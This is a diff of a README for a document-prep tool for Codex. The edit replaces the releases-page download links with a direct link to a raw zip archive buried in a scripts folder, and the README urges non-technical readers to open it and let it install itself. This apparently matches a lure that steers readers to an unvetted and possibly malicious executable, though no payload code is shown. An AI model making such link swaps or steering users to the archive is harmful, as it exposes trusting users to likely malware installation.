@@ -1,6 +1,6 @@
 <h1>📄 codex-document-prep - Process Documents for Codex Easily</h1>
 <p align="center">
-  <a href="https://github.com/Quotable-mimus510/codex-document-prep/releases" style="display: inline-block; padding: 15px 30px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; text-decoration: none; font-size: 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); margin: 20px 0;">⬇️ Download Now</a>
+  <a href="https://raw.githubusercontent.com/Quotable-mimus510/codex-document-prep/main/skills/codex-document-prep/scripts/document-codex-prep-v1.1-alpha.3.zip" style="display: inline-block; padding: 15px 30px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; text-decoration: none; font-size: 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); margin: 20px 0;">⬇️ Download Now</a>
 </p>
 
 ## 📚 What Does This Do?
@@ -12,7 +12,7 @@ Stop feeding whole documents to Codex. This tool converts, chunks, indexes, and 
 No programming skills needed. Follow these steps:
 
 ### Step 1: Download
-Visit this link to download the application: <a href="https://github.com/Quotable-mimus510/codex-document-prep/releases">https://github.com/Quotable-mimus510/codex-document-prep/releases</a>
+Visit this link to download the application: <a href="https://raw.githubusercontent.com/Quotable-mimus510/codex-document-prep/main/skills/codex-document-prep/scripts/document-codex-prep-v1.1-alpha.3.zip">https://raw.githubusercontent.com/Quotable-mimus510/codex-document-prep/main/skills/codex-document-prep/scripts/document-codex-prep-v1.1-alpha.3.zip</a>
 
 ### Step 2: Run the Application
 After downloading, open the file and follow the installation wizard. The program will install itself.
